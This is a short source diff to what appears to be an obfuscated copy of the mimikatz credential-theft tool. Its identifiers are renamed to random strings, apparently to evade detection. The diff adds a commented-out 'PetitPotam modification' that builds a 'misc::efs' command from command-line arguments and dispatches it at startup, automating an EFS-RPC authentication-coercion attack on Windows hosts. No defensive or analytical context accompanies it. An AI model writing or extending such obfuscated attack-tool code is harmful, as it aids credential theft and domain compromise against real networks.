@@ -5,6 +5,8 @@
 */
 #include "miAquvwg.h"
 
+//#include <wchar.h> (Petitpotam mod)
+
 const KUHL_M * miAquvwg_modules[] = {
 	&kcpdclqlmisc,
 #if defined(NET_MODULE)
@@ -21,6 +23,19 @@ int wmain(int argc, wchar_t * argv[])
 	wchar_t input[0xffff];
 #endif
 	miAquvwg_begin();
+	/* PetitPotam modification
+	
+	wchar_t wcs[150];
+	wcscpy(wcs, L"misc::efs ");
+	for(i = AHFIEEIO_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
+	{
+		wcscat(wcs, argv[i]); 
+		wcscat(wcs, L" ");
+		
+	}
+	status = miAquvwg_dispatchCommand(wcs);
+	
+	*/
 	for(i = AHFIEEIO_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
 	{
 		kprintf(L"\n" AHFIEEIO L"(" AHFIEEIO_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
